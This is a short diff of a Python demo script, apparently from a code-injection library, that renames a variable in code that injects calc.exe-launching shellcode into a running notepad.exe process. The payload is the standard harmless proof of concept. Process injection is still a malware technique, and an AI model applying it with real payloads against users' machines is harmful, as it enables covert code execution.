@@ -1,6 +1,6 @@
 #!/usr/bin/python
 from pycodeinjection import *
 
-PID = getPID("notepad.exe")
+target_pid = getPID("notepad.exe")
 shellcode = generateShellcode("calc.exe")
-injectShellcode(PID, shellcode)
+injectShellcode(target_pid, shellcode)
